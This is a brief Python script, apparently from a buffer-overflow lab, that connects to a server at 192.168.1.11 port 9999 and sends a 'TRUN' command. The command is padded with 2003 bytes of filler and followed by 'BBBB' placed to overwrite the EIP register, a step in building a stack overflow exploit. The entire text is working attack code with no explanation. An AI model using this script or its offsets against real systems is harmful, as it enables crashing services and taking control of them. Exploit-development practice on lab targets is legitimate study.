import time, struct, sys
import socket

server = "192.168.1.11"
port = 9999

OFFSET = "A" * 2003
EIP = "BBBB"
SAMPLE = "CCCCC"
space = "D"*1000
req = "TRUN /.:/" + OFFSET + EIP + SAMPLE + space
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
print(s.recv(1024))
s.send(req)
